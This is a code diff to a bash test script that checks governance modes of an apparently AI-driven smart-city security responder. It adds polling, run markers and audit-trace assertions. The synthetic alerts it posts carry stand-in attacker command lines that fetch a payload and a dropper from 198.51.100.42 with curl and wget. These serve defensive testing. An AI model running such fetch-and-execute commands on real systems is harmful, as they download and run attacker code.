@@ -141,6 +141,18 @@ PREEXIST_BLOCK_POLICY=0
 INITIAL_PENDING_AFTER_DRAIN=0
 RESTORE_DONE=0
 
+require_operational_llm() {
+    local diag operational
+    diag="$(curl -sS "${API_BASE}/api/llm/diagnostics" 2>/dev/null || true)"
+    operational="$(printf '%s' "$diag" | jq -r '.summary.operational // 0' 2>/dev/null || echo 0)"
+    if [[ "$operational" -lt 1 ]]; then
+        echo "Governance mode validation requires at least one operational LLM provider." >&2
+        echo "Current diagnostics summary:" >&2
+        printf '%s' "$diag" | jq '{summary, providers: (.providers | map_values({status, model, error_category, circuit_breaker_state}))}' >&2 || printf '%s\n' "$diag" >&2
+        exit 4
+    fi
+}
+
 restore_mode() {
     if [[ "$RESTORE_DONE" == "1" ]]; then
         return 0
@@ -166,6 +178,8 @@ login_payload="$(jq -nc --arg u "$AUTH_USER" --arg p "$AUTH_PASS" '{username:$u,
 login_resp="$(request_json "POST" "${API_BASE}/api/auth/login" "$login_payload")" || die "Authentication failed"
 AUTH_TOKEN="$(printf '%s' "$login_resp" | jq -r '.access_token // empty')"
 [[ -n "$AUTH_TOKEN" ]] || die "Authentication failed (no access_token)"
+
+require_operational_llm
 
 if command -v kubectl >/dev/null 2>&1; then
     if kubectl get networkpolicy -n smart-city block-198-51-100-42 >/dev/null 2>&1; then
@@ -195,6 +209,15 @@ set_force_autonomy() {
     fi
     request_json "POST" "${API_BASE}/api/governance/autonomy/force?enabled=${enabled}" "" \
         -H "Authorization: Bearer ${AUTH_TOKEN}" >/dev/null
+    local expect current attempts=0
+    expect="$([[ "$enabled" == "true" ]] && echo true || echo false)"
+    while [[ $attempts -lt 6 ]]; do
+        current="$(get_governance_status | jq -r 'if .autonomous_force_execution then "true" else "false" end' 2>/dev/null || echo unknown)"
+        [[ "$current" == "$expect" ]] && return 0
+        attempts=$((attempts + 1))
+        sleep 1
+    done
+    return 1
 }
 
 set_mode() {
@@ -266,6 +289,19 @@ drain_pending_queue() {
     ids_json="$(pending_ids_json "$pending_json")"
     rejected_count="$(reject_ids_json_array "$ids_json")"
     echo "pretest_cleanup_rejected:${rejected_count}"
+    wait_for_pending_count 0 >/dev/null
+}
+
+wait_for_pending_count() {
+    local expected="$1"
+    local attempts=0 current=""
+    while [[ $attempts -lt 8 ]]; do
+        current="$(get_pending | jq -r '.pending_count // 0' 2>/dev/null || echo unknown)"
+        [[ "$current" == "$expected" ]] && return 0
+        attempts=$((attempts + 1))
+        sleep 1
+    done
+    [[ "$current" == "$expected" ]]
 }
 
 block_policy_count() {
@@ -288,32 +324,33 @@ post_internal_alert_for_mode() {
     ts="$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
 
     local rule output priority proc_cmd src_ip
+    local marker="run-${RUN_ID:-$(date -u +%s)}"
     case "$mode" in
         manual)
             rule="Governance Mode Validation - Manual"
             priority="Critical"
-            output="Runtime compromise chain observed in traffic-camera: unexpected shell + outbound C2 callback + credential read attempt."
+            output="Runtime compromise chain observed in traffic-camera: unexpected shell + outbound C2 callback + credential read attempt. marker=${marker}"
             proc_cmd="/bin/sh -c curl http://198.51.100.42/payload.sh"
             src_ip="198.51.100.42"
             ;;
         assisted)
             rule="Governance Mode Validation - Assisted"
             priority="Critical"
-            output="Runtime compromise chain observed in traffic-camera: web exploit succeeded, reverse shell active, persistence artefact detected."
+            output="Runtime compromise chain observed in traffic-camera: web exploit succeeded, reverse shell active, persistence artefact detected. marker=${marker}"
             proc_cmd="/bin/sh -c wget http://198.51.100.42/dropper -O /tmp/dropper"
             src_ip="198.51.100.42"
             ;;
         autonomous_malicious)
             rule="Governance Mode Validation - Autonomous Malicious"
             priority="Critical"
-            output="Autonomous validation: confirmed malicious runtime chain with C2 callback and payload retrieval attempt from known-bad source."
+            output="Autonomous validation: confirmed malicious runtime chain with C2 callback and payload retrieval attempt from known-bad source. marker=${marker}"
             proc_cmd="/bin/sh -c curl http://198.51.100.42/payload.sh"
             src_ip="198.51.100.42"
             ;;
         autonomous)
-            rule="Governance Mode Validation - Autonomous"
+            rule="Governance Mode Validation - Autonomous Benign"
             priority="Informational"
-            output="Routine telemetry heartbeat from street-lighting gateway. No anomaly indicators detected."
+            output="Routine telemetry heartbeat from street-lighting gateway. No anomaly indicators detected. marker=${marker}"
             proc_cmd="/usr/bin/heartbeat --send --service street-lighting"
             src_ip=""
             ;;
@@ -329,6 +366,7 @@ post_internal_alert_for_mode() {
         --arg priority "$priority" \
         --arg ts "$ts" \
         --arg mode "$mode" \
+        --arg marker "$marker" \
         --arg proc_cmd "$proc_cmd" \
         --arg src_ip "$src_ip" \
         '{
@@ -341,7 +379,8 @@ post_internal_alert_for_mode() {
             "device.id":"traffic-camera-001",
             "proc.cmdline":$proc_cmd,
             "fd.sip":$src_ip,
-            "validation.mode":$mode
+            "validation.mode":$mode,
+            "validation.marker":$marker
           }
         }')"
 
@@ -370,35 +409,41 @@ mode_assertions() {
 
     case "$mode" in
         manual)
-            local has_pending pending_delta
+            local has_pending trace_pending_count
             has_pending="$(printf '%s' "$summary_json" | jq -r '[.actions_taken[]? | startswith("PENDING:")] | any')"
-            pending_delta="$(printf '%s' "$summary_json" | jq -r '.new_pending_count')"
+            trace_pending_count="$(printf '%s' "$summary_json" | jq -r '.trace_pending_count')"
             [[ "$has_pending" == "true" ]] || die "Manual mode assertion failed: expected PENDING action"
-            [[ "$pending_delta" -ge 1 ]] || die "Manual mode assertion failed: expected pending queue to increase"
+            [[ "$trace_pending_count" -ge 1 ]] || die "Manual mode assertion failed: expected alert-specific pending approval"
             ;;
         assisted)
-            local has_executed auto_before auto_after
+            local has_executed auto_before auto_after trace_executed_count
             has_executed="$(printf '%s' "$summary_json" | jq -r '[.actions_taken[]? | test("^(isolate_pod|scale_up|block_ip|cordon_node|restart_pod)\\(")] | any')"
             auto_before="$(printf '%s' "$summary_json" | jq -r '.metrics_before.auto_count')"
             auto_after="$(printf '%s' "$summary_json" | jq -r '.metrics_after.auto_count')"
+            trace_executed_count="$(printf '%s' "$summary_json" | jq -r '.trace_executed_count')"
             [[ "$has_executed" == "true" ]] || die "Assisted mode assertion failed: expected at least one executed high-confidence action"
+            [[ "$trace_executed_count" -ge 1 ]] || die "Assisted mode assertion failed: expected alert-specific executed governance action"
             [[ "$auto_after" -ge $((auto_before + 1)) ]] || die "Assisted mode assertion failed: auto_count did not increment"
             ;;
         autonomous)
-            local destructive_count pending_delta
+            local destructive_count trace_pending_count trace_executed_count
             destructive_count="$(printf '%s' "$summary_json" | jq -r '[.actions_taken[]? | test("^(isolate_pod|scale_up|block_ip|cordon_node|restart_pod)\\(")] | length')"
-            pending_delta="$(printf '%s' "$summary_json" | jq -r '.new_pending_count')"
+            trace_pending_count="$(printf '%s' "$summary_json" | jq -r '.trace_pending_count')"
+            trace_executed_count="$(printf '%s' "$summary_json" | jq -r '.trace_executed_count')"
             [[ "$destructive_count" -eq 0 ]] || die "Autonomous mode assertion failed: benign alert triggered destructive action"
-            [[ "$pending_delta" -eq 0 ]] || die "Autonomous mode assertion failed: benign alert created pending actions"
+            [[ "$trace_pending_count" -eq 0 ]] || die "Autonomous mode assertion failed: benign alert created alert-specific pending actions"
+            [[ "$trace_executed_count" -eq 0 ]] || die "Autonomous mode assertion failed: benign alert executed governance action"
             ;;
         autonomous_malicious)
-            local destructive_count pending_delta auto_before auto_after
+            local destructive_count pending_delta auto_before auto_after trace_executed_count
             destructive_count="$(printf '%s' "$summary_json" | jq -r '[.actions_taken[]? | test("^(isolate_pod|scale_up|block_ip|cordon_node|restart_pod)\\(")] | length')"
             pending_delta="$(printf '%s' "$summary_json" | jq -r '.new_pending_count')"
             auto_before="$(printf '%s' "$summary_json" | jq -r '.metrics_before.auto_count')"
             auto_after="$(printf '%s' "$summary_json" | jq -r '.metrics_after.auto_count')"
+            trace_executed_count="$(printf '%s' "$summary_json" | jq -r '.trace_executed_count')"
             [[ "$destructive_count" -ge 1 ]] || die "Autonomous malicious assertion failed: expected at least one destructive action"
             [[ "$pending_delta" -eq 0 ]] || die "Autonomous malicious assertion failed: should not queue pending approvals"
+            [[ "$trace_executed_count" -ge 1 ]] || die "Autonomous malicious assertion failed: expected alert-specific executed governance action"
             [[ "$auto_after" -ge $((auto_before + 1)) ]] || die "Autonomous malicious assertion failed: auto_count did not increment"
             ;;
         *) die "Unknown mode in assertions: $mode" ;;
@@ -412,6 +457,8 @@ run_mode_case() {
     if [[ "$mode" == "autonomous_malicious" ]]; then
         effective_mode="autonomous"
     fi
+
+    drain_pending_queue
 
     set_mode "$effective_mode" || die "Failed to set governance mode: $effective_mode"
     if [[ "$effective_mode" == "autonomous" && "$ENABLE_FULL_AUTONOMY" == "1" ]]; then
@@ -462,6 +509,7 @@ run_mode_case() {
     local cleanup_rejected="null"
     if [[ "$cleanup_required" == "1" ]]; then
         cleanup_rejected="$(reject_ids_json_array "$new_ids_json")"
+        wait_for_pending_count "$before_count" || die "Mode $mode cleanup failed to restore pending queue to baseline"
         local pending_after_cleanup_json
         pending_after_cleanup_json="$(get_pending)"
         cleanup_pending="$(printf '%s' "$pending_after_cleanup_json" | jq -r '.pending_count // 0')"
@@ -469,9 +517,11 @@ run_mode_case() {
         echo "${mode}_cleanup_pending:${cleanup_pending}"
     fi
 
-    local trace_json governance_steps
+    local trace_json governance_steps trace_pending_count trace_executed_count
     trace_json="$(request_json "GET" "${API_BASE}/api/audit/trace/alert-${alert_id}" "" -H "Authorization: Bearer ${AUTH_TOKEN}")"
     governance_steps="$(printf '%s' "$trace_json" | jq -r '[.steps[] | select(.event_type=="GOVERNANCE_ACTION" or .event_type=="ACTION_EXECUTED")] | length')"
+    trace_pending_count="$(printf '%s' "$trace_json" | jq -r '[.steps[] | select(.event_type=="GOVERNANCE_ACTION" and .status=="pending_approval")] | length')"
+    trace_executed_count="$(printf '%s' "$trace_json" | jq -r '[.steps[] | select(.event_type=="GOVERNANCE_ACTION" and .status=="executed")] | length')"
 
     local summary_json
     summary_json="$(jq -nc \
@@ -490,6 +540,8 @@ run_mode_case() {
       --argjson metrics_after "$metrics_after_json" \
       --argjson audit_step_count "$(printf '%s' "$trace_json" | jq -r '.step_count // 0')" \
       --argjson governance_trace_steps "$governance_steps" \
+      --argjson trace_pending_count "$trace_pending_count" \
+      --argjson trace_executed_count "$trace_executed_count" \
       --arg cleanup_pending "$cleanup_pending" \
       --arg cleanup_rejected "$cleanup_rejected" \
       '{
@@ -513,6 +565,8 @@ run_mode_case() {
         metrics_after:$metrics_after,
         audit_step_count:$audit_step_count,
         governance_trace_steps:$governance_trace_steps,
+        trace_pending_count:$trace_pending_count,
+        trace_executed_count:$trace_executed_count,
         cleanup_pending:(if $cleanup_pending=="null" then null else ($cleanup_pending|tonumber) end),
         cleanup_rejected:(if $cleanup_rejected=="null" then null else ($cleanup_rejected|tonumber) end)
       }')"
